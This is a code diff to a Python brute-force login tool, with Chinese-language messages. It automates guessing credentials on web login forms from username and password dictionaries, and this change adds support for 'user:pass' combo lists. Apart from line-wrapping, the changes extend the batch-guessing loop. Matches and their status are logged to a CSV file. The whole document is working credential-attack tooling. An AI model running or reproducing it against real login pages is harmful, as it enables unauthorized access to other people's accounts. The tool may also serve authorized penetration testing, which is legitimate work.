@@ -175,7 +175,8 @@ def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
             status = "匹配关键字失败"
 
         if result_str:
-            result_str = '"user:{}","pwd:{}","Url:{}","keyword:{}","status:{}"'.format(user, pwd, str(currentPageUrl), success_key_list, status)
+            result_str = '"user:{}","pwd:{}","Url:{}","keyword:{}","status:{}"'.format(user, pwd, str(currentPageUrl),
+                                                                                       success_key_list, status)
             f_result = open("Brute-Result.csv", "a+", encoding=RESULT_FILE_ENCODING)
             f_result.write(result_str + '\n')
             f_result.close()
@@ -199,18 +200,40 @@ def BatchBruteLogin(login_url=None, time_1=1, time_2=1,
                     pass_id=None, pass_name=None, pass_class=None, pass_css_selector=None,
                     button_id=None, button_name=None, button_class=None, button_css_selector=None,
                     user_dict='username.txt', pass_dict='password.txt', success_key_list=['success']):
-    with open(user_dict, 'r', ) as f_user:
-        for user in f_user.readlines():
+    if user_dict == pass_dict:
+        print('[+] 正在使用账号密码对格式字典文件 {} 进行爆破...'.format(user_dict))
+        with open(user_dict, 'r', ) as f_user:
+            user_pass_list = f_user.readlines()
+            for user_pass in user_pass_list:
+                user = user_pass.split(":", 1)[0].strip()
+                pwd = user_pass.split(":", 1)[-1].strip()
+                print('[*] 开始测试: {},{}'.format(user, pwd))
+                BruteLogin(user=user, pwd=pwd, login_url=login_url, time_1=time_1, time_2=time_2,
+                           user_id=user_id, user_name=user_name, user_class=user_class,
+                           user_css_selector=user_css_selector,
+                           pass_id=pass_id, pass_name=pass_name, pass_class=pass_class,
+                           pass_css_selector=pass_css_selector,
+                           button_id=button_id, button_name=button_name, button_class=button_class,
+                           button_css_selector=button_css_selector,
+                           success_key_list=success_key_list)
+    else:
+        with open(user_dict, 'r', ) as f_user:
+            user_list = f_user.readlines()
+        with open(pass_dict, 'r') as f_pwd:
+            pass_list = f_pwd.readlines()
+        for user in user_list:
             user = user.strip()
-            with open(pass_dict, 'r') as f_pwd:
-                for pwd in f_pwd.readlines():
-                    pwd = pwd.strip()
-                    print('[*] 开始测试: {},{}'.format(user, pwd))
-                    BruteLogin(user=user, pwd=pwd, login_url=login_url, time_1=time_1, time_2=time_2,
-                               user_id=user_id, user_name=user_name, user_class=user_class, user_css_selector=user_css_selector,
-                               pass_id=pass_id, pass_name=pass_name, pass_class=pass_class, pass_css_selector=pass_css_selector,
-                               button_id=button_id, button_name=button_name, button_class=button_class, button_css_selector=button_css_selector,
-                               success_key_list=success_key_list)
+            for pwd in pass_list:
+                pwd = pwd.strip()
+                print('[*] 开始测试: {},{}'.format(user, pwd))
+                BruteLogin(user=user, pwd=pwd, login_url=login_url, time_1=time_1, time_2=time_2,
+                           user_id=user_id, user_name=user_name, user_class=user_class,
+                           user_css_selector=user_css_selector,
+                           pass_id=pass_id, pass_name=pass_name, pass_class=pass_class,
+                           pass_css_selector=pass_css_selector,
+                           button_id=button_id, button_name=button_name, button_class=button_class,
+                           button_css_selector=button_css_selector,
+                           success_key_list=success_key_list)
 
 
 if __name__ == '__main__':
@@ -240,9 +263,12 @@ if __name__ == '__main__':
     try:
         # 开始进行批量爆破
         BatchBruteLogin(login_url=config.login_url, time_1=config.time_1, time_2=config.time_2,
-                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name, user_css_selector=config.user_css_selector,
-                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name, pass_css_selector=config.pass_css_selector,
-                        button_id=config.button_id, button_class=config.button_class, button_name=config.button_name, button_css_selector=config.button_css_selector,
+                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name,
+                        user_css_selector=config.user_css_selector,
+                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name,
+                        pass_css_selector=config.pass_css_selector,
+                        button_id=config.button_id, button_class=config.button_class, button_name=config.button_name,
+                        button_css_selector=config.button_css_selector,
                         user_dict=config.user_dict, pass_dict=config.pass_dict, success_key_list=SUCCESS_KEY_LIST)
     except Exception as error:
         print("[!] 注意:爆破模块发生错误,错误内容：{}".format(error))
